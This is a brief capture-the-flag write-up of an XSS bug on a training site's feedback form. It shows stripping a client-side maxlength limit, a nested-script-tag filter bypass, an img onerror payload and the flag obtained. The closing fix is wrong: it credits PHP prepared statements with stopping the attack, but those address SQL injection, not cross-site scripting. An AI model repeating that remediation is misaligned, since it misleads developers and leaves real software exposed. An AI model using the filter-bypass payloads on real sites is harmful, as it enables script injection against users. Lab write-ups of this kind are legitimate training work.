# XSS Basic
On this page [http://192.168.8.120/?page=feedback](http://192.168.8.120/?page=feedback "Feedback page") xss has been Found

## Manipulation

The ***name*** textbox ***max-length*** is set to 10 characters

``` html
<input name="txtName" type="text" size="30" maxlength="10">
```
We then change the html maxlength attribute to 100000, or rather remove it.

``` html
<input name="txtName" type="text" size="30" maxlength="100000">
```
The ***textbox*** refuses to take a script tag, it might be using ***regular expression*** to filter out script tag.

But the ***regular expression*** used unable to filter this script out
``` javascript
<scr<script>ipt>alert(1)</script>
```

We then insert img tag to get a flag
``` html
<img src=1 href=1 onerror="javascript:alert(1)"></img>
```
>0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

## Solution 
text at the backend must be treated as strings, and since the site uses php, prepared statements must be used to prevent this.